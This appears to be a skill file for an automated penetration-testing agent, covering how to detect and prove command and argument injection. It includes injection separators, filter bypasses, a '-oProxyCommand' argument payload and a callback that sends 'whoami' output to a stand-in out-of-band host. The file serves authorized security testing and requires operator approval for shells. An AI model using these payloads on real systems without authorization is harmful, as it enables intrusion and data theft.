---
name: command-injection
description: Detect OS command injection and argument injection in parameters that reach system commands
origin: Vigil
vuln_class: cmdi
---

# Command Injection Testing

## When to Activate

- Input reaches a system command or an OS utility's arguments: file conversion (ImageMagick,
  FFmpeg, LibreOffice, Ghostscript, wkhtmltopdf), DNS lookup/ping tools, git operations, archive
  extraction (tar, unzip), PDF generation; parameters naming files, hosts, IPs, URLs or paths.

Classic `; id` in a search field is rare on modern frameworks. The yield is in **argument
injection** into tools with dangerous flags and in glue code that pipes input through a shell.

`--technique CMDI`; deliver via `vigil assess kali exec --technique CMDI --intent "<purpose>"
--probe-kind payload --phase consume-test --timeout 30 -- curl …`, switching to `--probe-kind
exploit` after execution is confirmed. Try `%0a` first as the separator. Windows space and
caret/wildcard obfuscation, backslash-newline splitting, polyglots, and argument injection per
wrapper tool (git, tar, curl/wget, ssh, ImageMagick, FFmpeg, PHP-CGI Best-Fit):
`agent/references/payloads/command-injection-payloads.md`. Seed variants with
`vigil assess classify-payload <value> --mutations`; rank a sweep with `vigil assess anomaly-score`.

## Decide the execution path

- **Shell or direct exec?** `shell=True`, `system()`, backticks, `exec()` with a string, or a
  `sh -c` wrapper interpret separators; `execve`/`spawn`, `subprocess` with `shell=False`,
  `execFile` and multi-argument `system` do not — then only argument injection applies. `sh` is
  often dash: no brace expansion or `$'…'`, though `${IFS}` works.
- **Argument injection gate:** does input become an argv element of a program with dangerous
  flags? If yes it can yield file read/write, SSRF or RCE without any shell. Check where `--`
  sits relative to your input.

## Proving it blind

- **Timing:** `sleep 5` then `sleep 10` (or `ping -c N`, `timeout /t N`) must scale the delta
  above measured jitter, repeated.
- **OOB** (`agent/references/offensive-tactics/frp-tunneling.md` "OOB Procedure
  (mint→poll→correlate)"): the callback must carry a command-derived label,
  `$(nslookup $(whoami).$OOB_HOST)`. A bare lookup of the host is the expected behaviour of the
  ping and DNS-lookup features that are this class's main surface, so it proves nothing. Reproduce
  with a second payload shape (`dig`, `curl`, `certutil` on Windows). An empty `matched` with
  healthy OOB is a target result (no egress or no execution); fall back to timing.
- **Read-back via another bug:** write to `/tmp` only and read it through a separate file-read or
  SSRF primitive; writing into the webroot changes target state and needs operator approval
  (`agent/shared-constraints.md` §1).

## Exploitation proof

Show the attacker outcome (`agent/rules/hunting.md` §2) with the minimum that proves it: `id`,
hostname, environment or a config path that proves access to secrets, internal reach (`ip addr`,
`/etc/hosts`, metadata reachability) and the container boundary (`/proc/1/cgroup`,
`/.dockerenv`). Reading `/etc/shadow` or credentials in bulk and reverse shells go beyond
proof: a shell needs the operator's listener (`agent/shared-constraints.md` §2a,
`agent/references/offensive-tactics/shell-handling.md`) and approval. Severity:
`agent/references/finding-fp-and-severity-gate.md`; format:
`agent/references/runtime-guides/web-finding-recording.md`.

## Kill and escalate

- Direct exec confirmed → stop separator testing, keep argument injection. A negative needs the
  timing pass, OOB with a label and the filter-bypass families (`agent/rules/hunting.md` §13).
- Confirmed RCE on one parameter → check sibling parameters and endpoints sharing the wrapper
  (`agent/rules/hunting.md` §6).
- Escalate when: a timing delta scales; different filters give different errors (a partial
  filter; enumerate `${IFS}`, `$@`, globbing, `cat<<<file`); the parameter feeds a wrapper tool
  (ffmpeg, ImageMagick/gm, Ghostscript, wkhtmltopdf, rsvg-convert, ping, curl, git, tar,
  `find -exec`, xsltproc) or carries filenames, URLs, repos or archive members (filename-as-flag:
  `-oProxyCommand=…`, `--output=…`).
